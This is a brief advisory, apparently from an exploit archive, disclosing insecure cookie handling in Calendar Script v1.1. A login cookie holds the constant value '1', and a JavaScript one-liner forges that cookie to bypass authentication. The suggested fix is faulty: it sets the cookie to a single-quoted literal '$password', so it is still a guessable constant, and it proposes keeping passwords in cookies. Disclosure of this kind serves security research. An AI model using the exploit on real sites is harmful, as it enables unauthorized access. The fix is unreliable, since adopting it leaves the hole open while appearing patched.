Calendar Script 1.1 Insecure Cookie Handling Vulnerability
==========================================================


[START]

#########################################################################################
[0x01] Informations:

Script         : Calendar Script v1.1
Download       : http://www.hotscripts.com/jump.php?listing_id=71365&jump_type=1
Vulnerability  : Insecure Cookie Handling
Author         : Osirys
Website        : http://osirys.org
Notes          : Proud to be Italian
Greets:        : XaDoS, x0r, emgent, Jay, Todd and AlpHaNiX


#########################################################################################
[0x02] Bug: [Insecure Cookie Handling]
######

Bugged file is: /[path]/index.php

[CODE]

if(mysql_num_rows($checkDetails) > 0) {
    setcookie(&#039;nodstrumCalendarV2&#039;, &#039;1&#039;, time()+3600);	// Cookie will expire in 1 hour.
    // $loginMsg = &#039;<span style="color: green">You are logged in<i>!</i></span>&#039;;
}

[/CODE]

If we login in correctly, a cookie is created with &#039;nodstrumCalendarV2&#039; as name and
&#039;1&#039; as content.

## [!] FIX: Change name or content to the cookie. Example:

[CODE]

if(mysql_num_rows($checkDetails) > 0) {
    setcookie(&#039;nodstrumCalendarV2&#039;, &#039;$password&#039;, time()+3600);	// Cookie will expire in 1 hour.
    // $loginMsg = &#039;<span style="color: green">You are logged in<i>!</i></span>&#039;;
}

[/CODE]


### [!] EXPLOIT: javascript:document.cookie = "nodstrumCalendarV2=1; path=/";


#########################################################################################

[/END]




